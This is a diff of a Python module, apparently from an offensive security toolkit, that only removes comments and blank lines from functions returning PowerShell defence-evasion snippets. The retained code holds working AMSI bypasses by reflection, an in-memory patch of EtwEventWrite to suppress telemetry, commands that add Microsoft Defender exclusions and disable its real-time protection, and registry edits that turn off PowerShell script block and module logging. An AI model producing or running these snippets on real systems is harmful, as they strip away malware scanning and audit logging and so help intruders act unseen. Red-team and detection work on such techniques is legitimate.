@@ -11,8 +11,6 @@ __all__ = [
     "constrained_language_check",
 ]
 
-# ── AMSI ─────────────────────────────────────────────────────────────────────
-
 _AMSI_PATCHES: dict[str, str] = {
     "reflection": (
         "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
@@ -20,7 +18,6 @@ _AMSI_PATCHES: dict[str, str] = {
         ".SetValue($null,$true)"
     ),
     "patch_bytes": (
-        # Patches AmsiScanBuffer to return AMSI_RESULT_CLEAN (0x80070057 → ret 0)
         "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
         "$b=$a.GetField('amsiSession','NonPublic,Static');"
         "$b.SetValue($null,$null);"
@@ -44,7 +41,6 @@ _AMSI_PATCHES: dict[str, str] = {
     ),
 }
 
-
 def amsi_bypass(technique: str = "reflection") -> str:
     """Return a PowerShell AMSI bypass snippet.
 
@@ -52,10 +48,6 @@ def amsi_bypass(technique: str = "reflection") -> str:
         technique: ``reflection`` | ``patch_bytes`` | ``com_bypass``.
     """
     return _AMSI_PATCHES.get(technique, _AMSI_PATCHES["reflection"])
-
-
-# ── ETW ──────────────────────────────────────────────────────────────────────
-
 
 def etw_bypass() -> str:
     """Return a PowerShell snippet that patches EtwEventWrite to suppress ETW telemetry."""
@@ -73,19 +65,13 @@ def etw_bypass() -> str:
         "[System.Runtime.InteropServices.Marshal]::WriteByte($addr,0xc3)"
     )
 
-
-# ── Windows Defender ─────────────────────────────────────────────────────────
-
-
 def defender_exclusion_command(path: str) -> str:
     """Return a PowerShell command to add a Defender path exclusion (requires admin)."""
     return f"Add-MpPreference -ExclusionPath '{path}'"
 
-
 def disable_defender_realtime() -> str:
     """Return a PowerShell command to disable Defender real-time protection (requires admin)."""
     return "Set-MpPreference -DisableRealtimeMonitoring $true"
-
 
 def scriptblock_logging_disable() -> list[str]:
     """Return registry commands to disable PowerShell Script Block Logging."""
@@ -93,7 +79,6 @@ def scriptblock_logging_disable() -> list[str]:
         'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f',
         'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 0 /f',
     ]
-
 
 def constrained_language_check() -> str:
     """Return a PowerShell command to check if Constrained Language Mode is active."""
